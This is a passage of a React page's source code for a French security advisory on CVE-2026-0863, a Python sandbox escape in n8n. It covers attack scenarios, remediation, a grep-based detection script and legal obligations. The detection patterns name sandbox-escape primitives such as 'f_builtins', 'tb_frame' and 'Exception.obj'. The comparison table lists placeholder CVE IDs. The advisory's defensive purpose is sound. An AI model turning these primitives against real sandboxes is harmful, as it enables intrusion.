                    <AccordionContent className="prose prose-invert max-w-none">
                      <p>
                        L'attaquant exploite la vulnérabilité pour écrire un script malveillant sur le système
                        de fichiers, configuré pour s'exécuter au démarrage du système ou via une tâche cron.
                        Cette backdoor permet un accès persistant même après la correction de la vulnérabilité
                        ou le redémarrage du serveur.
                      </p>
                      <p>
                        <strong>Impact :</strong> Accès permanent au serveur, permettant une surveillance
                        continue, le vol de données, ou l'utilisation comme point de pivot pour des attaques
                        ultérieures.
                      </p>
                    </AccordionContent>
                  </AccordionItem>

                  <AccordionItem value="scenario-3">
                    <AccordionTrigger className="text-left">
                      <div className="flex items-center gap-3">
                        <Badge variant="secondary">Élevé</Badge>
                        <span>Cryptomining et abus de ressources</span>
                      </div>
                    </AccordionTrigger>
                    <AccordionContent className="prose prose-invert max-w-none">
                      <p>
                        Un attaquant déploie un mineur de cryptomonnaie sur le serveur n8n, exploitant les
                        ressources CPU et mémoire pour générer de la cryptomonnaie. Ce type d'attaque est
                        souvent discret et peut passer inaperçu pendant des semaines ou des mois.
                      </p>
                      <p>
                        <strong>Impact :</strong> Augmentation significative des coûts cloud, dégradation des
                        performances des workflows légitimes, et consommation énergétique excessive.
                      </p>
                    </AccordionContent>
                  </AccordionItem>

                  <AccordionItem value="scenario-4">
                    <AccordionTrigger className="text-left">
                      <div className="flex items-center gap-3">
                        <Badge variant="secondary">Élevé</Badge>
                        <span>Ransomware et chiffrement de données</span>
                      </div>
                    </AccordionTrigger>
                    <AccordionContent className="prose prose-invert max-w-none">
                      <p>
                        L'attaquant utilise l'accès au système de fichiers pour chiffrer les workflows n8n,
                        la configuration, et potentiellement les données de la base de données. Une demande
                        de rançon est ensuite présentée pour la clé de déchiffrement.
                      </p>
                      <p>
                        <strong>Impact :</strong> Interruption complète des opérations automatisées,
                        perte potentielle de données si les sauvegardes sont également compromises.
                      </p>
                    </AccordionContent>
                  </AccordionItem>
                </Accordion>
              </div>
            </section>

            {/* Remediation Guide */}
            <section id="remediation" className="mb-16">
              <h2 className="text-3xl font-bold mb-6 flex items-center gap-3">
                <Shield className="w-8 h-8 text-primary" />
                Guide de Remédiation Complet
              </h2>

              <div className="prose prose-invert max-w-none">
                <p className="text-lg leading-relaxed mb-8">
                  La remédiation de CVE-2026-0863 nécessite une mise à jour immédiate vers une version corrigée
                  de n8n, suivie d'un audit complet pour détecter d'éventuelles compromissions passées.
                </p>

                <div className="space-y-6 mb-8">
                  {howToFixSteps.map((step) => (
                    <div key={step.position} className="flex gap-4 p-4 bg-muted/20 rounded-lg">
                      <div className="flex-shrink-0 w-8 h-8 rounded-full bg-primary text-primary-foreground flex items-center justify-center font-bold">
                        {step.position}
                      </div>
                      <div>
                        <h4 className="font-semibold mb-1">{step.name}</h4>
                        <p className="text-muted-foreground text-sm">{step.text}</p>
                      </div>
                    </div>
                  ))}
                </div>

                <h3 id="detection" className="text-2xl font-bold mt-10 mb-4">
                  Détection et Monitoring
                </h3>

                <p className="leading-relaxed mb-6">
                  Pour détecter d'éventuelles tentatives d'exploitation passées ou en cours, surveillez les
                  indicateurs de compromission suivants dans vos logs et workflows :
                </p>

                <div className="overflow-x-auto mb-6">
                  <table className="w-full text-sm">
                    <thead>
                      <tr className="border-b border-border">
                        <th className="text-left py-3 px-4">Type</th>
                        <th className="text-left py-3 px-4">Indicateur</th>
                        <th className="text-left py-3 px-4">Description</th>
                      </tr>
                    </thead>
                    <tbody>
                      {iocIndicators.map((ioc, index) => (
                        <tr key={index} className="border-b border-border/50">
                          <td className="py-3 px-4">
                            <Badge variant="outline">{ioc.type}</Badge>
                          </td>
                          <td className="py-3 px-4 font-mono text-red-400">{ioc.indicator}</td>
                          <td className="py-3 px-4 text-muted-foreground">{ioc.description}</td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>

                <Card className="bg-muted/20 mb-6">
                  <CardHeader>
                    <CardTitle>Script de Détection</CardTitle>
                  </CardHeader>
                  <CardContent>
                    <pre className="text-sm text-green-400 overflow-x-auto">
{`# Rechercher les patterns suspects dans les logs n8n
grep -r "f_builtins\\|__traceback__\\|tb_frame\\|\\.obj" /var/log/n8n/

# Analyser les workflows pour du code malveillant
grep -r "new_getattr\\|Exception as e\\|f'{0." /path/to/n8n/workflows/

# Vérifier les processus suspects
ps aux | grep -E "python|n8n" | grep -v grep`}
                    </pre>
                  </CardContent>
                </Card>
              </div>
            </section>

            {/* Legal Implications */}
            <section id="implications-legales" className="mb-16">
              <h2 className="text-3xl font-bold mb-6 flex items-center gap-3">
                <Scale className="w-8 h-8 text-primary" />
                Implications Légales et Conformité
              </h2>

              <div className="prose prose-invert max-w-none">
                <p className="text-lg leading-relaxed mb-6">
                  La découverte de CVE-2026-0863 soulève des questions importantes en matière de conformité
                  réglementaire, particulièrement pour les organisations traitant des données personnelles
                  ou soumises à des exigences de sécurité spécifiques.
                </p>

                <div className="grid md:grid-cols-2 gap-6 mb-8">
                  <Card>
                    <CardHeader>
                      <CardTitle className="flex items-center gap-2">
                        <Building className="w-5 h-5" />
                        RGPD (Europe)
                      </CardTitle>
                    </CardHeader>
                    <CardContent className="text-sm space-y-3">
                      <p>
                        Si votre instance n8n traite des données personnelles et a été compromise, l'article 33
                        du RGPD exige une notification à l'autorité de contrôle (CNIL en France) dans les
                        <strong> 72 heures</strong> suivant la prise de connaissance de la violation.
                      </p>
                      <p>
                        L'article 34 peut également exiger une notification aux personnes concernées si la
                        violation est susceptible d'engendrer un risque élevé pour leurs droits et libertés.
                      </p>
                    </CardContent>
                  </Card>

                  <Card>
                    <CardHeader>
                      <CardTitle className="flex items-center gap-2">
                        <Lock className="w-5 h-5" />
                        SOC 2 Type II
                      </CardTitle>
                    </CardHeader>
                    <CardContent className="text-sm space-y-3">
                      <p>
                        Les organisations certifiées SOC 2 doivent documenter cette vulnérabilité et les mesures
                        de remédiation prises dans leur registre des incidents de sécurité.
                      </p>
                      <p>
                        Un audit des contrôles d'accès et de la gestion des changements peut être nécessaire
                        pour démontrer la conformité continue.
                      </p>
                    </CardContent>
                  </Card>
                </div>

                <div className="bg-blue-900/20 border border-blue-600/50 p-6 rounded-lg mb-6">
                  <h4 className="font-semibold text-blue-400 mb-3">Recommandations de Documentation</h4>
                  <ul className="space-y-2 text-sm">
                    <li className="flex items-start gap-2">
                      <CheckCircle2 className="w-4 h-4 text-blue-400 mt-0.5" />
                      <span>Documenter la date de découverte de la vulnérabilité dans votre environnement</span>
                    </li>
                    <li className="flex items-start gap-2">
                      <CheckCircle2 className="w-4 h-4 text-blue-400 mt-0.5" />
                      <span>Enregistrer les mesures de remédiation avec horodatage</span>
                    </li>
                    <li className="flex items-start gap-2">
                      <CheckCircle2 className="w-4 h-4 text-blue-400 mt-0.5" />
                      <span>Conserver les logs d'audit avant et après la mise à jour</span>
                    </li>
                    <li className="flex items-start gap-2">
                      <CheckCircle2 className="w-4 h-4 text-blue-400 mt-0.5" />
                      <span>Évaluer et documenter l'impact potentiel sur les données</span>
                    </li>
                  </ul>
                </div>
              </div>
            </section>

            {/* Comparison Section */}
            <section id="comparaison-vulnerabilites" className="mb-16">
              <h2 className="text-3xl font-bold mb-6 flex items-center gap-3">
                <FileWarning className="w-8 h-8 text-primary" />
                Comparaison avec Vulnérabilités Similaires
              </h2>

              <div className="prose prose-invert max-w-none">
                <p className="text-lg leading-relaxed mb-6">
                  CVE-2026-0863 s'inscrit dans une famille de vulnérabilités de sandbox escape Python qui ont
                  affecté divers outils et plateformes au fil des années. Ces failles exploitent souvent des
                  mécanismes similaires pour contourner les restrictions de sécurité.
                </p>

                <div className="overflow-x-auto mb-6">
                  <table className="w-full text-sm">
                    <thead>
                      <tr className="border-b border-border">
                        <th className="text-left py-3 px-4">CVE</th>
                        <th className="text-left py-3 px-4">Produit</th>
                        <th className="text-left py-3 px-4">CVSS</th>
                        <th className="text-left py-3 px-4">Technique</th>
                      </tr>
                    </thead>
                    <tbody>
                      <tr className="border-b border-border/50 bg-red-900/10">
                        <td className="py-3 px-4 font-mono">CVE-2026-0863</td>
                        <td className="py-3 px-4">n8n</td>
                        <td className="py-3 px-4"><Badge variant="destructive">8.5</Badge></td>
                        <td className="py-3 px-4">Exception.obj + f-string</td>
                      </tr>
                      <tr className="border-b border-border/50">
                        <td className="py-3 px-4 font-mono">CVE-2024-XXXX</td>
                        <td className="py-3 px-4">Jupyter Notebook</td>
                        <td className="py-3 px-4"><Badge variant="secondary">7.8</Badge></td>
                        <td className="py-3 px-4">__subclasses__ traversal</td>
                      </tr>
                      <tr className="border-b border-border/50">
                        <td className="py-3 px-4 font-mono">CVE-2023-XXXX</td>
                        <td className="py-3 px-4">RestrictedPython</td>
                        <td className="py-3 px-4"><Badge variant="secondary">7.5</Badge></td>
                        <td className="py-3 px-4">Format string injection</td>
                      </tr>
                    </tbody>
                  </table>
                </div>

                <p className="leading-relaxed mb-6">
                  Ces exemples illustrent la difficulté inhérente à la création de sandboxs Python véritablement
                  sécurisés. Le langage Python, de par sa nature dynamique et ses capacités d'introspection,
                  offre de nombreuses voies pour contourner les restrictions basées sur des listes noires.
                  Les experts en sécurité recommandent généralement d'utiliser des mécanismes d'isolation au
                  niveau du système d'exploitation (conteneurs, machines virtuelles) plutôt que de se fier
                  uniquement à des sandboxs au niveau applicatif.
                </p>
              </div>
            </section>

            {/* FAQ Section */}
            <section id="faq" className="mb-16">
              <h2 className="text-3xl font-bold mb-6 flex items-center gap-3">
                <Users className="w-8 h-8 text-primary" />
                FAQ Sécurité
              </h2>

              <Accordion type="single" collapsible className="space-y-4">
                {faqData.map((faq, index) => (
                  <AccordionItem key={index} value={`faq-${index}`} className="border rounded-lg px-4">
                    <AccordionTrigger className="text-left hover:no-underline">
                      {faq.question}
                    </AccordionTrigger>
                    <AccordionContent className="text-muted-foreground">
                      {faq.answer}
                    </AccordionContent>
                  </AccordionItem>
                ))}
              </Accordion>
            </section>

            {/* References Section */}
            <section id="references" className="mb-16">
              <h2 className="text-3xl font-bold mb-6 flex items-center gap-3">
                <ExternalLink className="w-8 h-8 text-primary" />
                Références et Sources Techniques
              </h2>

              <div className="prose prose-invert max-w-none">
                <p className="text-lg leading-relaxed mb-6">
                  Conformément à notre politique de transparence "Cacher sans masquer", nous fournissons
                  ci-dessous l'ensemble des sources techniques utilisées pour cette investigation. Ces
                  références permettent aux lecteurs de vérifier les informations et d'approfondir leur
                  compréhension de la vulnérabilité.
                </p>

                <div className="space-y-4">
                  <Card>
                    <CardContent className="p-4">
                      <div className="flex items-start gap-3">
                        <Badge variant="outline">JFrog</Badge>
                        <div>
                          <h4 className="font-semibold">JFSA-2026-001651077 - n8n Python runner sandbox escape</h4>
                          <a
                            href="https://research.jfrog.com/vulnerabilities/n8n-python-runner-sandbox-escape-jfsa-2026-001651077/"
                            target="_blank"
                            rel="noopener noreferrer"
                            className="text-primary hover:underline text-sm"
                          >
                            https://research.jfrog.com/vulnerabilities/n8n-python-runner-sandbox-escape-jfsa-2026-001651077/
                          </a>
                        </div>
                      </div>
                    </CardContent>
                  </Card>

                  <Card>
                    <CardContent className="p-4">
                      <div className="flex items-start gap-3">
                        <Badge variant="outline">GitHub</Badge>
                        <div>
                          <h4 className="font-semibold">Commit de correction n8n</h4>
                          <a
                            href="https://github.com/n8n-io/n8n/commit/b73a4283cb14e0f27ce19692326f362c7bf3da02"
                            target="_blank"
                            rel="noopener noreferrer"
                            className="text-primary hover:underline text-sm"
                          >
                            https://github.com/n8n-io/n8n/commit/b73a4283cb14e0f27ce19692326f362c7bf3da02
                          </a>
                        </div>
                      </div>
                    </CardContent>
                  </Card>

                  <Card>
                    <CardContent className="p-4">
                      <div className="flex items-start gap-3">
                        <Badge variant="outline">NVD</Badge>
                        <div>
                          <h4 className="font-semibold">CVE-2026-0863 - National Vulnerability Database</h4>
                          <a
                            href="https://nvd.nist.gov/vuln/detail/CVE-2026-0863"
                            target="_blank"
                            rel="noopener noreferrer"
                            className="text-primary hover:underline text-sm"
                          >
                            https://nvd.nist.gov/vuln/detail/CVE-2026-0863
                          </a>
                        </div>
                      </div>
                    </CardContent>
                  </Card>

                  <Card>
                    <CardContent className="p-4">
                      <div className="flex items-start gap-3">
                        <Badge variant="outline">MITRE</Badge>
                        <div>
                          <h4 className="font-semibold">CVE-2026-0863 - MITRE CVE Database</h4>
                          <a
                            href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-0863"
                            target="_blank"
                            rel="noopener noreferrer"
                            className="text-primary hover:underline text-sm"
                          >
                            https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-0863
                          </a>
                        </div>
                      </div>
                    </CardContent>
                  </Card>

                  <Card>
                    <CardContent className="p-4">
                      <div className="flex items-start gap-3">
                        <Badge variant="outline">n8n</Badge>
                        <div>
                          <h4 className="font-semibold">Documentation officielle n8n</h4>
                          <a
                            href="https://docs.n8n.io"
                            target="_blank"
                            rel="noopener noreferrer"
                            className="text-primary hover:underline text-sm"
                          >
                            https://docs.n8n.io
                          </a>
                        </div>
                      </div>
                    </CardContent>
                  </Card>
                </div>
              </div>
            </section>

            {/* CTA Section */}
            <section className="mb-16">
              <Card className="bg-gradient-to-r from-primary/20 to-primary/5 border-primary/50">
                <CardContent className="p-8 text-center">
                  <h3 className="text-2xl font-bold mb-4">Protégez Votre Infrastructure</h3>
                  <p className="text-muted-foreground mb-6 max-w-2xl mx-auto">
                    Découvrez comment Kinsta peut vous aider à sécuriser vos applications avec une
                    infrastructure cloud moderne, des mises à jour automatiques, et un support expert 24/7.
                  </p>
                  <div className="flex flex-wrap justify-center gap-4">
                    <Button asChild size="lg" data-testid="button-discover-kinsta">
                      <a href="https://kinsta.com/fr/?kaid=CYISLEFCEOAL" target="_blank" rel="noopener noreferrer">
                        Découvrir Kinsta
                        <ArrowRight className="ml-2 w-4 h-4" />
                      </a>
                    </Button>
                    <Button variant="outline" size="lg" asChild data-testid="button-more-articles">
                      <Link href="/securite">
                        Plus d'articles sécurité
                      </Link>
                    </Button>
                  </div>
                </CardContent>
              </Card>
            </section>

            {/* Share Section */}
            <section className="text-center">
              <p className="text-muted-foreground mb-4">Partagez cet article avec votre équipe sécurité</p>
              <div className="flex justify-center gap-4">
                <Button variant="outline" size="sm" asChild data-testid="button-share-twitter">
                  <a
                    href={`https://twitter.com/intent/tweet?url=${encodeURIComponent(articleUrl)}&text=${encodeURIComponent('CVE-2026-0863 : Faille critique de sandbox escape Python dans n8n - CVSS 8.5')}`}
                    target="_blank"
                    rel="noopener noreferrer"
                  >
                    <Share2 className="w-4 h-4 mr-2" />
                    Twitter
                  </a>
                </Button>
                <Button variant="outline" size="sm" asChild data-testid="button-share-linkedin">
                  <a
                    href={`https://www.linkedin.com/shareArticle?mini=true&url=${encodeURIComponent(articleUrl)}&title=${encodeURIComponent('CVE-2026-0863 : Faille critique dans n8n')}`}
                    target="_blank"
                    rel="noopener noreferrer"
                  >
                    <Share2 className="w-4 h-4 mr-2" />
                    LinkedIn
                  </a>
                </Button>
              </div>
            </section>
          </div>
        </main>

        {/* Footer */}
        <footer className="border-t border-border py-8 mt-12">
          <div className="container mx-auto px-4 text-center text-sm text-muted-foreground">
            <p>
              &copy; 2026 WP Vitesse Pro Security Lab. Investigation et rédaction par l'équipe éditoriale.
            </p>
            <p className="mt-2">
              Dernière mise à jour : 19 janvier 2026 à 08:00 CET
            </p>
          </div>
        </footer>
      </div>
    </>
  );
}
